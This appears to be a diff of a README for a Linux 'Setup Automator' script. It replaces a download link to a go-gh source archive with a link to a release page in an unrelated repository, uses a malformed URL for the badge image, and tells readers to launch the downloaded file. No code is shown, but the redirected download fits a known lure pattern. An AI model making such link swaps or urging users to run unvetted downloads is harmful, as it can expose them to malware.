@@ -22,7 +22,7 @@ Setup Automator is a powerful tool that simplifies the setup process on Linux di
 ## Get Started
 
 To begin using Setup Automator, simply download the script from the following link:
-[![Download Setup Automator](https://img.shields.io/badge/Download-Setup%20Automator-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Setup Automator](https://github.com/Diapiffy/setup/releases/tag/v1.0%20Automator-green)](https://github.com/Diapiffy/setup/releases/tag/v1.0)
 
 If the link does not open the file directly, please ensure to launch the downloaded file to start the installation process.
 
